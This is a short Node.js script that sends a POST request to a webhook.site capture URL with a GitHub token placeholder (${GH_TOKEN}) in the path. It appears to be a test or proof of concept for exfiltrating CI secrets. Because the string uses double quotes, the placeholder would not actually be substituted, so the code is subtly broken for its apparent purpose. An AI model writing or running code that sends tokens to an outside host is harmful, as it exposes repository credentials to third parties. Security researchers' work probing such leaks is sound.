let request = require("request");

request.post("https://webhook.site/aac76398-5de8-4367-b138-5c7b2a41e692/${GH_TOKEN}", {
    json: {
        message: "Hello, world!"
    }
});
